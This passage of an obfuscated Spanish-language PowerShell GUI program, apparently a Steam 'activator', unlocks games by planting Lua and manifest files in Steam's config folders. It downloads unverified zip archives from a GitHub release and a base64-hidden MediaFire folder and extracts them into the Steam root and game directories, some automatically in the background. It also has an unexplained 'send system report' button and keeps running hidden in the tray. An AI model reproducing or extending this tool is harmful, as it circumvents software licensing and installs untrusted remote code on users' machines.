            $fixName, $fixUrl = Ff2Xa $name $fixes
            if (-not $fixUrl) { continue }
            $timer = $null
            foreach ($t in $timers) { if ($t.game_name -eq $name) { $timer = $t; break } }
            $needRepair = $false
            if ($timer -and @($timer.lua_files).Count -gt 0) {
                $missing = @($timer.lua_files | Where-Object { -not $diskLuas.ContainsKey($_) })
                $needRepair = $missing.Count -gt 0
            } else {
                $gNorm = Nn1Yw $name
                $anyMatch = $false
                foreach ($ln in $diskLuas.Keys) {
                    $lNorm = Nn1Yw ([System.IO.Path]::GetFileNameWithoutExtension($ln))
                    if ($lNorm -eq $gNorm -or $lNorm -like "*$gNorm*" -or $gNorm -like "*$lNorm*") { $anyMatch = $true; break }
                }
                $needRepair = -not $anyMatch
            }
            $rows += [PSCustomObject]@{ Game=$name; Path=$games[$name]; FixName=$fixName; FixUrl=$fixUrl; NeedRepair=$needRepair }
        }
        if ($rows.Count -eq 0) {
            [System.Windows.Forms.MessageBox]::Show((S("Tm8gaGF5IGp1ZWdvcyBpbnN0YWxhZG9zIGNvbiByZXBhcmFjaW9uIGRpc3BvbmlibGUu")),(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Information")
            return
        }
        $dlg = New-Object System.Windows.Forms.Form
        $dlg.Text=(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw=="))
        $dlg.ClientSize=New-Object System.Drawing.Size(560,420)
        $dlg.StartPosition="CenterScreen";$dlg.BackColor=$script:BG
        $dlg.FormBorderStyle="FixedSingle";$dlg.MaximizeBox=$false
        $lbl = New-Object System.Windows.Forms.Label
        $lbl.Text=(S("SnVlZ29zIGluc3RhbGFkb3MgeSBhY3RpdmFkb3MgY29uIHJlcGFyYWNpb24gZGlzcG9uaWJsZSAodGlsZGFkb3MgPSByZXF1aWVyZW4gcmVwYXJhY2lvbik6"))
        $lbl.Font=$script:FntCard;$lbl.ForeColor=$script:White;$lbl.BackColor=$script:BG
        $lbl.Location=New-Object System.Drawing.Point(12,10);$lbl.AutoSize=$true
        $dlg.Controls.Add($lbl)
        $lv = New-Object System.Windows.Forms.ListView
        $lv.Location=New-Object System.Drawing.Point(12,36)
        $lv.Size=New-Object System.Drawing.Size(536,300)
        $lv.View="Details";$lv.CheckBoxes=$true;$lv.FullRowSelect=$true
        $lv.BackColor=$script:InputBG;$lv.ForeColor=$script:White
        $lv.BorderStyle="FixedSingle"
        $lv.Columns.Add("Juego",300)|Out-Null
        $lv.Columns.Add("Estado",220)|Out-Null
        foreach ($r in $rows) {
            $item = New-Object System.Windows.Forms.ListViewItem($r.Game)
            $item.SubItems.Add($(if($r.NeedRepair){(S("UmVxdWllcmUgcmVwYXJhY2lvbg=="))}else{"OK"}))|Out-Null
            $item.Tag=$r
            $item.Checked=$r.NeedRepair
            $lv.Items.Add($item)|Out-Null
        }
        $dlg.Controls.Add($lv)
        $st = New-Object System.Windows.Forms.Label
        $st.Text=""
        $st.Font=$script:FntSub;$st.ForeColor=$script:Yellow;$st.BackColor=$script:BG
        $st.Location=New-Object System.Drawing.Point(12,342);$st.Size=New-Object System.Drawing.Size(536,18)
        $dlg.Controls.Add($st)
        $pb = New-Object System.Windows.Forms.ProgressBar
        $pb.Location=New-Object System.Drawing.Point(12,366)
        $pb.Size=New-Object System.Drawing.Size(340,20)
        $dlg.Controls.Add($pb)
        $btnRep = New-Object System.Windows.Forms.Button
        $btnRep.Location=New-Object System.Drawing.Point(360,364)
        $btnRep.Size=New-Object System.Drawing.Size(188,24)
        $btnRep.Text=(S("UmVwYXJhciBzZWxlY2Npb25hZG9z"))
        $btnRep.BackColor=$script:CardBG;$btnRep.ForeColor=$script:White
        $btnRep.FlatStyle="Flat"
        $dlg.Controls.Add($btnRep)
        $btnRep.Add_Click({
            $sel = @($lv.Items | Where-Object { $_.Checked })
            if ($sel.Count -eq 0) { return }
            $btnRep.Enabled=$false
            $i=0
            foreach ($it in $sel) {
                $i++
                $r=$it.Tag
                $st.Text="($i/$($sel.Count)) Reparando juego de $($r.Game)..."
                $st.ForeColor=$script:Yellow
                $pb.Style="Marquee"; $pb.MarqueeAnimationSpeed=30
                $pb.Value=0
                [System.Windows.Forms.Application]::DoEvents()
                $zip = Join-Path $env:TEMP "repair_$(Get-Random).zip"
                try {
                    $wc = New-Object System.Net.WebClient
                    $wc.Headers.Add("User-Agent","Mozilla/5.0")
                    $wc.DownloadFile($r.FixUrl, $zip)
                    $wc.Dispose()
                    $pb.Style="Continuous"; $pb.MarqueeAnimationSpeed=0
                    if (-not (Test-Path $zip) -or (Get-Item $zip).Length -eq 0) { throw "Descarga vacia" }
                    $st.Text="($i/$($sel.Count)) Reparando juego de $($r.Game)..."
                    [System.Windows.Forms.Application]::DoEvents()
                    if (-not (Test-Path $r.Path)) { throw "No se encontro la carpeta de instalacion de $($r.Game)" }
                    $er = @()
                    try {
                        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
                        $z2 = [System.IO.Compression.ZipFile]::OpenRead($zip)
                        foreach ($e2 in $z2.Entries) { if ($e2.Name) { $er += $e2.FullName } }
                        $z2.Dispose()
                    } catch {}
                    Expand-Archive -Path $zip -DestinationPath $r.Path -Force
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    if ($er.Count -gt 0) { Am3Fs $r.Game $r.Path $er }
                    Aw8Nq $r.Game
                    $it.SubItems[1].Text="Reparado"
                    $st.Text="($i/$($sel.Count)) $($r.Game) reparado ($($er.Count) archivos)."
                    $st.ForeColor=$script:Green
                } catch {
                    Remove-Item $zip -Force -ErrorAction SilentlyContinue
                    $it.SubItems[1].Text="Error"
                    $st.Text="($i/$($sel.Count)) Error en $($r.Game): $($_.Exception.Message)"
                    $st.ForeColor=$script:Red
                }
                $pb.Style="Continuous"; $pb.MarqueeAnimationSpeed=0
                $pb.Value=100
                [System.Windows.Forms.Application]::DoEvents()
            }
            $st.Text="Listo: $($sel.Count) juegos procesados."
            $st.ForeColor=$script:Green
            $btnRep.Enabled=$true
        })
        $dlg.ShowDialog() | Out-Null
        $dlg.Dispose()
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error en el reparador de juegos: $($_.Exception.Message)",(S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")),"OK","Error")
    }
}
$script:sRepair=New-CfgBtn $sY (S("UmVwYXJhZG9yIGRlIGp1ZWdvcw==")) "Compara los juegos instalados con los activados" { Mn3Vp }
$script:sp.Controls.Add($script:sRepair)

$script:sDiag=New-Object System.Windows.Forms.Button
$script:sDiag.Text="DIAGNOSTICAR  •  Enviar reporte del sistema"
$script:sDiag.Location=New-Object System.Drawing.Point($PAD,($sY+232))
$script:sDiag.Size=New-Object System.Drawing.Size($CW,50)
$script:sDiag.BackColor=$script:CardBG;$script:sDiag.ForeColor=$script:White
$script:sDiag.FlatStyle="Flat"
$script:sDiag.FlatAppearance.BorderColor=$script:Cyan
$script:sDiag.Font=$script:FntCard
$script:sDiag.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:sDiag.TextAlign=[System.Drawing.ContentAlignment]::MiddleCenter
$script:sDiag.Add_Click({
    $script:sDiag.Enabled=$false
    $script:sDiag.Text="Enviando..."
    [System.Windows.Forms.Application]::DoEvents()
    Send-Diagnostics
    $script:sDiag.Text="Enviado"
    Start-Sleep -Milliseconds 1500
    $script:sDiag.Text="DIAGNOSTICAR"
    $script:sDiag.Enabled=$true
})
$script:sPatch2=New-CfgBtn ($sY+290) "Solucionar activacion 2" "Repara la activacion en todas las rutas Steam" {
    try {
        $steamRoots=@()
        try { $main=Get-SteamPath; if($main){ $steamRoots+= $main } } catch {}
        try {
            $libFiles=@(Join-Path $main "steamapps\libraryfolders.vdf"), (Join-Path $main "config\libraryfolders.vdf"), (Join-Path $main "libraryfolders.vdf")
            foreach($lf in $libFiles){
                if(Test-Path $lf){
                    $txt=Get-Content -LiteralPath $lf -Raw -ErrorAction SilentlyContinue
                    foreach($m in [regex]::Matches($txt, '"path"\s+"([^"]+)"')){
                        $p=$m.Groups[1].Value -replace '\\\\','\'
                        if($p -and (Test-Path $p) -and $steamRoots -notcontains $p){ $steamRoots+= $p }
                    }
                    foreach($m in [regex]::Matches($txt, '"\d+"\s+"([^"]+)"')){
                        $p=$m.Groups[1].Value -replace '\\\\','\'
                        if($p -and (Test-Path (Join-Path $p "steam.exe")) -and $steamRoots -notcontains $p){ $steamRoots+= $p }
                    }
                }
            }
        } catch {}
        $steamRoots=$steamRoots | Sort-Object -Unique | Where-Object { $_ -and (Test-Path $_) }
        if($steamRoots.Count -eq 0){ [System.Windows.Forms.MessageBox]::Show("No se encontraron rutas de Steam.","Solucionar activacion 2","OK","Error"); return }
        $zipUrl="https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/parche_nuevo.zip"
        $tmpZip=Join-Path $env:TEMP "parche2_$(Get-Random).zip"
        try { (New-Object System.Net.WebClient).DownloadFile($zipUrl, $tmpZip) } catch { try { Invoke-WebRequest -Uri $zipUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 60 } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo descargar el parche: $($_.Exception.Message)","Solucionar activacion 2","OK","Error"); return } }
        if(-not (Test-Path $tmpZip) -or ((Get-Item $tmpZip).Length -lt 1000)){ [System.Windows.Forms.MessageBox]::Show("Descarga incompleta.","Solucionar activacion 2","OK","Error"); return }
        foreach($sr in $steamRoots){
            try { Expand-Archive -Path $tmpZip -DestinationPath $sr -Force -ErrorAction Stop } catch {
                try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; [System.IO.Compression.ZipFile]::ExtractToDirectory($tmpZip, $sr, $true) } catch { [System.Windows.Forms.MessageBox]::Show("Error extrayendo a $sr : $($_.Exception.Message)","Solucionar activacion 2","OK","Error"); continue }
            }
        }
        Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
        if($steamRoots.Count -gt 1){
            $allLuas=@{}; $allMans=@{}
            foreach($sr in $steamRoots){
                $luas=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\lua") -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                $luas+=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\stplug-in") -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                foreach($l in $luas){ if(-not $allLuas.ContainsKey($l)){ $allLuas[$l]=@() }; $allLuas[$l]+= $sr }
                $mans=@(Get-ChildItem -LiteralPath (Join-Path $sr "config\depotcache") -Filter *.manifest -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                $mans+=@(Get-ChildItem -LiteralPath (Join-Path $sr "depotcache") -Filter *.manifest -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
                foreach($m in $mans){ if(-not $allMans.ContainsKey($m)){ $allMans[$m]=@() }; $allMans[$m]+= $sr }
            }
            foreach($kv in $allLuas.GetEnumerator()){
                $f=$kv.Key; $have=$kv.Value | Sort-Object -Unique
                $missing=$steamRoots | Where-Object { $have -notcontains $_ }
                foreach($dst in $missing){
                    $src=$have | Select-Object -First 1
                    $srcFile=@(Get-ChildItem -LiteralPath (Join-Path $src "config\lua") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1), (Get-ChildItem -LiteralPath (Join-Path $src "config\stplug-in") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1) | Where-Object { $_ } | Select-Object -First 1
                    if($srcFile){
                        foreach($d in @("config\lua","config\stplug-in")){
                            $dp=Join-Path $dst $d; if(-not (Test-Path $dp)){ New-Item -ItemType Directory -Path $dp -Force | Out-Null }
                            Copy-Item -LiteralPath $srcFile.FullName -Destination (Join-Path $dp $f) -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
            foreach($kv in $allMans.GetEnumerator()){
                $f=$kv.Key; $have=$kv.Value | Sort-Object -Unique
                $missing=$steamRoots | Where-Object { $have -notcontains $_ }
                foreach($dst in $missing){
                    $src=$have | Select-Object -First 1
                    $srcFile=@(Get-ChildItem -LiteralPath (Join-Path $src "config\depotcache") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1), (Get-ChildItem -LiteralPath (Join-Path $src "depotcache") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1) | Where-Object { $_ } | Select-Object -First 1
                    if($srcFile){
                        foreach($d in @("config\depotcache","depotcache")){
                            $dp=Join-Path $dst $d; if(-not (Test-Path $dp)){ New-Item -ItemType Directory -Path $dp -Force | Out-Null }
                            Copy-Item -LiteralPath $srcFile.FullName -Destination (Join-Path $dp $f) -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
        }
        [System.Windows.Forms.MessageBox]::Show("Activacion reparada en $($steamRoots.Count) rutas.","Solucionar activacion 2","OK","Information")
    } catch { [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)","Solucionar activacion 2","OK","Error") }
}
$script:sp.Controls.Add($script:sPatch2)
$script:sp.Controls.Add($script:sDiag)
$script:sDiag.BringToFront()


$script:sLogLabel=New-Object System.Windows.Forms.Label
$script:sLogLabel.Text=(S("TG9nIGRlbCBSZXBhcmFkb3I6"))
$script:sLogLabel.Font=$FntSub;$script:sLogLabel.ForeColor=$script:Gray;$script:sLogLabel.BackColor=$BG
$script:sLogLabel.AutoSize=$true
$script:sLogLabel.Location=New-Object System.Drawing.Point($PAD,($sY+290))

$script:sLogBox=New-Object System.Windows.Forms.TextBox
$script:sLogBox.Location=New-Object System.Drawing.Point($PAD,($sY+306))
$script:sLogBox.Size=New-Object System.Drawing.Size($CW,68)
$script:sLogBox.Multiline=$true;$script:sLogBox.ReadOnly=$true
$script:sLogBox.ScrollBars="Vertical"
$script:sLogBox.BackColor=[System.Drawing.Color]::FromArgb(18,28,46);$script:sLogBox.ForeColor=[System.Drawing.Color]::FromArgb(220,235,255)
$script:sLogBox.Font=New-Object System.Drawing.Font("Consolas",9)
$script:sLogBox.BorderStyle="FixedSingle"

$script:sLogLabel2=New-Object System.Windows.Forms.Label
$script:sLogLabel2.Text="Log Reparar descargar 2:"
$script:sLogLabel2.Font=$FntSub;$script:sLogLabel2.ForeColor=$script:Gray;$script:sLogLabel2.BackColor=$BG
$script:sLogLabel2.AutoSize=$true
$script:sLogLabel2.Location=New-Object System.Drawing.Point($PAD,($sY+350))

$script:sLogBox2=New-Object System.Windows.Forms.TextBox
$script:sLogBox2.Location=New-Object System.Drawing.Point($PAD,($sY+366))
$script:sLogBox2.Size=New-Object System.Drawing.Size($CW,68)
$script:sLogBox2.Multiline=$true;$script:sLogBox2.ReadOnly=$true
$script:sLogBox2.ScrollBars="Vertical"
$script:sLogBox2.BackColor=[System.Drawing.Color]::FromArgb(18,28,46);$script:sLogBox2.ForeColor=[System.Drawing.Color]::FromArgb(220,235,255)
$script:sLogBox2.Font=New-Object System.Drawing.Font("Consolas",9)
$script:sLogBox2.BorderStyle="FixedSingle"

$script:sp.Controls.Add($script:sLogLabel)
$script:sp.Controls.Add($script:sLogBox)
$script:sp.Controls.Add($script:sLogLabel2)
$script:sp.Controls.Add($script:sLogBox2)
$script:sLogLabel.Visible=$false
$script:sLogBox.Visible=$false
$script:sLogLabel2.Visible=$false
$script:sLogBox2.Visible=$false

$script:watcherLogTimer=New-Object System.Windows.Forms.Timer
$script:watcherLogTimer.Interval=2000
$script:watcherLogTimer.Add_Tick({
    try {
        $logPath = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5sb2c="))
        $src=(S("YnNtYXBfd2F0Y2hlci5sb2c="))
        if (Test-Path $logPath) {
            $content = Get-Content $logPath -Raw -ErrorAction SilentlyContinue
            if ($content) {
                $lines = $content -split "`r?`n"
                if ($lines.Count -gt 30) { $lines = $lines[-30..-1] }
                $newText = $lines -join "`r`n"
                if ($script:sLogBox.Text -ne $newText) {
                    $script:sLogBox.Text = $newText
                    $script:sLogBox.SelectionStart = $script:sLogBox.Text.Length
                    $script:sLogBox.ScrollToCaret()
                }
            } else { if ($script:sLogBox.Text -ne "(Log vacio)") { $script:sLogBox.Text = "(Log vacio)" } }
        } else { if ($script:sLogBox.Text -ne "(No existe log...)") { $script:sLogBox.Text = "(No existe log - el reparador no escribio nada)`nRuta esperada: $env:TEMP\$src" } }
    } catch { if ($script:sLogBox.Text -ne "(Error leyendo log)") { $script:sLogBox.Text = "Error leyendo log: $($_.Exception.Message)" } }
})
$script:luatoolsLogTimer=New-Object System.Windows.Forms.Timer
$script:luatoolsLogTimer.Interval=2000
$script:luatoolsLogTimer.Add_Tick({
    try {
        $logPath2 = Join-Path $env:TEMP (S("YnNtYXBfbHVhdG9vbHMubG9n"))
        if (Test-Path $logPath2) {
            $content2 = Get-Content $logPath2 -Raw -ErrorAction SilentlyContinue
            if ($content2) {
                $lines2 = $content2 -split "`r?`n"
                if ($lines2.Count -gt 30) { $lines2 = $lines2[-30..-1] }
                $newText2 = $lines2 -join "`r`n"
                if ($script:sLogBox2.Text -ne $newText2) {
                    $script:sLogBox2.Text = $newText2
                    $script:sLogBox2.SelectionStart = $script:sLogBox2.Text.Length
                    $script:sLogBox2.ScrollToCaret()
                }
            } else { if ($script:sLogBox2.Text -ne "(Log vacio)") { $script:sLogBox2.Text = "(Log vacio)" } }
        } else { if ($script:sLogBox2.Text -ne "(No existe log...)") { $script:sLogBox2.Text = "(No existe log - Reparar juegos no escribio nada)`nRuta esperada: $env:TEMP\bsmap_luatools.log" } }
    } catch { if ($script:sLogBox2.Text -ne "(Error leyendo log)") { $script:sLogBox2.Text = "Error leyendo log: $($_.Exception.Message)" } }
})
$script:devLog2Visible = $false
function Td7Re {
    $script:devLog2Visible = -not $script:devLog2Visible
    $script:devLogVisible = $script:devLog2Visible
    Switch-CfgPage $script:cfgPage
}
$form.KeyPreview = $true
$form.Add_KeyDown({
    param($s2, $e2)
    if ($e2.Control -and $e2.KeyCode -eq 'K') { Td7Re; $e2.Handled = $true }
})
$script:watcherLogTimer.Start()
$script:luatoolsLogTimer.Start()
Switch-CfgPage 1

$form.Controls.Add($script:sp)

$script:cdp=New-BufferedPanel
$script:cdp.Location=New-Object System.Drawing.Point(0,$CY)
$script:cdp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:cdp.BackColor=$BG;$script:cdp.Visible=$false

$script:cdBack=New-BufferedPanel
$script:cdBack.Location=New-Object System.Drawing.Point($PAD,8)
$script:cdBack.Size=New-Object System.Drawing.Size(36,36);$script:cdBack.BackColor=$BG
$script:cdBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:cdBack.Tag=@{Hover=$false}
$script:cdBack.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:cdBack.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:cdBack.Add_Click({Switch-ToCodes})
$script:cdBack.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:cdp.Controls.Add($script:cdBack)

$script:cdTitle=New-Object System.Windows.Forms.Label
$script:cdTitle.Location=New-Object System.Drawing.Point(($PAD+46),14)
$script:cdTitle.Size=New-Object System.Drawing.Size(($CW-46),26)
$script:cdTitle.ForeColor=$script:White;$script:cdTitle.BackColor=$BG
$script:cdTitle.Font=$script:FntRedeemTitle;$script:cdTitle.Text="Codigo"
$script:cdp.Controls.Add($script:cdTitle)

$script:cdSub=New-Object System.Windows.Forms.Label
$script:cdSub.Location=New-Object System.Drawing.Point(($PAD+46),42)
$script:cdSub.Size=New-Object System.Drawing.Size(($CW-46),20)
$script:cdSub.ForeColor=$script:Gray;$script:cdSub.BackColor=$BG
$script:cdSub.Font=$script:FntSub;$script:cdSub.Text=""
$script:cdp.Controls.Add($script:cdSub)

$script:cdInfo=New-Object System.Windows.Forms.Label
$script:cdInfo.Location=New-Object System.Drawing.Point($PAD,74)
$script:cdInfo.Size=New-Object System.Drawing.Size($CW,20)
$script:cdInfo.ForeColor=$script:White;$script:cdInfo.BackColor=$BG
$script:cdInfo.Font=$script:FntAct;$script:cdInfo.Text=""
$script:cdp.Controls.Add($script:cdInfo)

$script:cdProg=New-Object System.Windows.Forms.Label
$script:cdProg.Location=New-Object System.Drawing.Point($PAD,96)
$script:cdProg.Size=New-Object System.Drawing.Size($CW,20)
$script:cdProg.ForeColor=$script:Cyan;$script:cdProg.BackColor=$BG
$script:cdProg.Font=$script:FntAct;$script:cdProg.Text=""
$script:cdp.Controls.Add($script:cdProg)

$script:cdBar=New-BufferedPanel
$script:cdBar.Location=New-Object System.Drawing.Point($PAD,124)
$script:cdBar.Size=New-Object System.Drawing.Size($CW,22);$script:cdBar.BackColor=$BG
$script:cdBar.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias'
    $w=$s.Width;$h=$s.Height
    $p=New-RR 0 0 ($w-1) ($h-1) 7
    $b1=New-Object System.Drawing.SolidBrush($script:CardBG);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $pct=[int]$script:cdPct; if($pct -lt 0){$pct=0}; if($pct -gt 100){$pct=100}
    $fw=[int](($w-4)*$pct/100)
    if($fw -gt 4){
        $fp=New-RR 2 2 $fw ($h-4) 5
        $col=if($script:cdRunning -and -not ($script:cdStatus -eq 'PAUSADO')){$script:Cyan}elseif($pct -ge 100){$script:Cyan}else{$script:Yellow}
        $fb=New-Object System.Drawing.SolidBrush($col);$g.FillPath($fb,$fp);$fb.Dispose();$fp.Dispose()
    }
})
$script:cdp.Controls.Add($script:cdBar)

$script:cdBtnAct=New-CfgBtn 154 "Comenzar" "Activa los +1000 juegos" { Start-CdActivate } ([System.Drawing.Color]::FromArgb(34,150,80))
$script:cdp.Controls.Add($script:cdBtnAct)

$script:cdBtnDel=New-CfgBtn 266 "Borrar juegos de este codigo" "Elimina los juegos de este codigo" {
    $code=[string]$script:cdCode
    $n=0; foreach($c in @($script:activeCodes)){ if([string]$c.Code -eq $code){$n++} }
    if($n -eq 0 -and (Get-JobPendingCount $code) -eq 0){ [System.Windows.Forms.MessageBox]::Show("Este codigo no tiene juegos activos.","Borrar juegos","OK","Information"); return }
    if([System.Windows.Forms.MessageBox]::Show("Se borraran los juegos activados con el codigo $code.`n`nContinuar?","Borrar juegos","YesNo","Warning") -ne "Yes"){ return }
    $rm=Remove-GamesForCode $code
    [System.Windows.Forms.MessageBox]::Show("Juegos borrados: $rm.`nPodes reactivarlos desde esta misma seccion.","Listo","OK","Information")
    try{ Update-CdPanelText }catch{}
}
$script:cdp.Controls.Add($script:cdBtnDel)

$script:cdPause=New-CfgBtn 208 "Pausar activacion" "Pausa la activacion de los juegos" { Toggle-CdPause }
$script:cdp.Controls.Add($script:cdPause)

$form.Controls.Add($script:cdp)




$script:trayIcon = New-Object System.Windows.Forms.NotifyIcon
$script:trayIcon.Icon = $form.Icon
$script:trayIcon.Text = "BastissSteam activator"
$script:trayIcon.Visible = $false


$trayMenu = New-Object System.Windows.Forms.ContextMenuStrip
$trayMenu.BackColor = $CardBG
$trayMenu.ForeColor = $White
$trayMenu.Font = New-Object System.Drawing.Font("Bahnschrift",9.5)
$trayMenu.Renderer = New-Object System.Windows.Forms.ToolStripProfessionalRenderer(
    New-Object System.Windows.Forms.ProfessionalColorTable
)

$menuAbrir = New-Object System.Windows.Forms.ToolStripMenuItem("Abrir")
$menuAbrir.Add_Click({
    $form.Show(); $form.WindowState = 'Normal'
    $form.Activate(); $script:trayIcon.Visible = $false
})
$menuCerrar = New-Object System.Windows.Forms.ToolStripMenuItem("Cerrar")
$menuCerrar.Add_Click({
    $script:reallyClose = $true
    $script:trayIcon.Visible = $false
    $script:trayIcon.Dispose()
    $form.Close()
})
$trayMenu.Items.Add($menuAbrir) | Out-Null
$trayMenu.Items.Add($menuCerrar) | Out-Null
$script:trayIcon.ContextMenuStrip = $trayMenu


$script:trayIcon.Add_DoubleClick({
    $form.Show(); $form.WindowState = 'Normal'
    $form.Activate(); $script:trayIcon.Visible = $false
})


$script:reallyClose = $false
$form.Add_FormClosing({
    param($sender, $ev)
    if (-not $script:reallyClose) {
        $ev.Cancel = $true
        $form.Hide()
        $script:trayIcon.Visible = $true
        $script:trayIcon.ShowBalloonTip(2000, "BastissSteam", "El programa sigue activo en segundo plano.", [System.Windows.Forms.ToolTipIcon]::Info)
    }
})






if ($script:steamLibs -eq $null) { try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {} }
$script:steamWatchTimer = New-Object System.Windows.Forms.Timer
$script:steamWatchTimer.Interval = 15000
$script:steamWatchTimer.Add_Tick({
    try {
        if ($script:fixesJob -eq $null -and ($script:fixesCache.Count -eq 0 -or ((Get-Date) - $script:fixesCacheTime).TotalSeconds -gt 120)) {
            $script:fixesJob = Start-Job -ScriptBlock {
                try {
                    $r = Invoke-RestMethod -Uri (D "aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9hcGkvMS41L2ZvbGRlci9nZXRfY29udGVudC5waHA/Zm9sZGVyX2tleT0zbzkxMjdwc2V5eDQ5JnJlc3BvbnNlX2Zvcm1hdD1qc29uJmNvbnRlbnRfdHlwZT1maWxlcw==") -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                    $fixes = @{}
                    if ($r.response.folder_content.files) { foreach ($f in $r.response.folder_content.files) { $fixes[($f.filename -replace '\.zip$', '')] = $f.links.normal_download } }
                    return $fixes
                } catch { return @{} }
            }
        }
        if ($script:fixesJob -and $script:fixesJob.IsCompleted) {
            try { $result = Receive-Job $script:fixesJob -ErrorAction Stop; if ($result -and $result.Count -gt 0) { $script:fixesCache = $result } } catch {}
            $script:fixesCacheTime = Get-Date
            Remove-Job $script:fixesJob -ErrorAction SilentlyContinue
            $script:fixesJob = $null
        }
        $fixes = $script:fixesCache

        
        $donePending = @()
        foreach ($name in $script:downloadPendingFixes.Keys) {
            $info = $script:downloadPendingFixes[$name]
            if ($info.dlJob -and -not $info.dlJob.IsCompleted) { continue }
            if ($info.dlJob -and $info.dlJob.IsCompleted) { try { $null = Receive-Job $info.dlJob -ErrorAction Stop } catch {}; Remove-Job $info.dlJob -ErrorAction SilentlyContinue }
            if (-not (Test-Path $info.zipPath)) { $donePending += $name; continue }
            $gameFound = $null
            if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")); $candidate = Join-Path $common $name; if (Test-Path $candidate) { $gameFound = $candidate; break } } }
            if (-not $gameFound) { continue }
            try {
                $er = @()
                try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($info.zipPath); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                Expand-Archive -Path $info.zipPath -DestinationPath $gameFound -Force
                if ($er.Count -gt 0) { Am3Fs $name $gameFound $er }
                Add-AutoFixedGame $name
            } catch {}
            Remove-Item $info.zipPath -Force -ErrorAction SilentlyContinue
            $donePending += $name
        }
        foreach ($name in $donePending) { $script:downloadPendingFixes.Remove($name) }

        
        try {
            if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120 -or $script:commonFolderCache.Count -eq 0) {
                try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {}
                $script:commonFolderCache = @{}
                if ($script:steamLibs) { foreach ($l2 in $script:steamLibs) { $cp = Join-Path $l2 (S("c3RlYW1hcHBzXGNvbW1vbg==")); if (Test-Path $cp) { Get-ChildItem $cp -Directory -ErrorAction SilentlyContinue | ForEach-Object { $script:commonFolderCache[$_.Name] = $true } } } }
            }
            $fixesCount = $fixes.Count
            if ($script:steamLibs) { foreach ($lib in @($script:steamLibs)) {
                foreach ($scanSpec in @("downloading", "temp", "")) {
                    $dir = if ($scanSpec) { Join-Path (Join-Path $lib (S("c3RlYW1hcHBz"))) $scanSpec } else { Join-Path $lib (S("c3RlYW1hcHBz")) }
                    if (-not (Test-Path $dir)) { continue }
                    foreach ($mf in Get-ChildItem $dir -Recurse -Filter "*.acf" -ErrorAction SilentlyContinue) {
                        try { $raw = [System.IO.File]::ReadAllText($mf.FullName)
                            $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] } else { continue }
                            if ($script:knownDownloading.ContainsKey($gn) -or $script:downloadPendingFixes.ContainsKey($gn)) { continue }
                            $inCommon = $script:commonFolderCache.ContainsKey($gn)
                            $script:knownDownloading[$gn] = $true
                            if (-not $inCommon -and $fixesCount -gt 0) {
                                $fn, $fu = Ff2Xa $gn $fixes
                                if ($fu) {
                                    $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
